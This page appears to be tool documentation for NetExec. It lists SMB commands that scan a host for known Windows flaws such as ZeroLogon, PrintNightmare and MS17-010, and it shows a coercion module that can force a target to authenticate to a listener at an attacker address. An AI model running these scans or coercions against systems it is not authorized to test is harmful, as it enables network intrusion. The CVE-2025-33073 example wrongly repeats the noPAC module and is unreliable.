---
description: Check if host is vulnerable
---

# Scan for Vulnerabilities

## Scan for Vulnerabilities

When you start your internal pentest, these are the first modules you should try:

#### ZeroLogon

```bash
nxc smb <ip> -u '' -p '' -M zerologon
```

#### noPAC

```bash
nxc smb <ip> -u 'user' -p 'pass' -M nopac
```

{% hint style="warning" %}
You need a credential for noPAC vulnerability check.
{% endhint %}

#### PrintNightmare

```bash
nxc smb <ip> -u '' -p '' -M printnightmare
```

#### SMBGhost

```bash
nxc smb <ip> -u '' -p '' -M smbghost
```

#### MS17-010 (Not tested outside LAB environment)

```bash
nxc smb <ip> -u '' -p '' -M ms17-010
```

#### NTLM reflection (CVE-2025-33073)

```bash
nxc smb <ip> -u 'user' -p 'pass' -M nopac
```

{% hint style="warning" %}
You need credentials for CVE-2025-33073 vulnerability check.
{% endhint %}

Or, try them all at once! Just list each one: `-M zerologon -M printnightmare`

## Scan for Coerce Vulnerabilities

You can check for coerce vulnerabilities such as PetitPotam, DFSCoerce, PrinterBug, MSEven and ShadowCoerce using the coerce\_plus module. You can also use credentials to check for these vulnerabilities. By default the LISTENER ip will be set to localhost, so no traffic will appear on the network.

```bash
nxc smb <ip> -u '' -p '' -M coerce_plus
```

If a vulnerability is found, you can set a LISTENER ip to coerce the connection.

```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP>
```

To run all exploit methods at once, add the ALWAYS=true option, otherwise it will stop if the underlying RPC connection reports a successful coercion.

```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true
```

You can also check for a specific coerce method by specifying it:

```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
```

{% hint style="success" %}
Instead of using the `METHOD` option, you can use its short form `M`. Similarly, the argument `LISTENER` can be shortened to `L`.

This also applies to the names of the vulnerabilities when specifying a method.

M=p // Invalid, as both petitpotam and printerbug start with ‘p’ so modules gives error

M=pr // Matches printerbug

M=pe // Matches petitpotam

M=dfs // Matches dfscoerce
{% endhint %}

Check out what other modules are available via `nxc <protocol> -L`
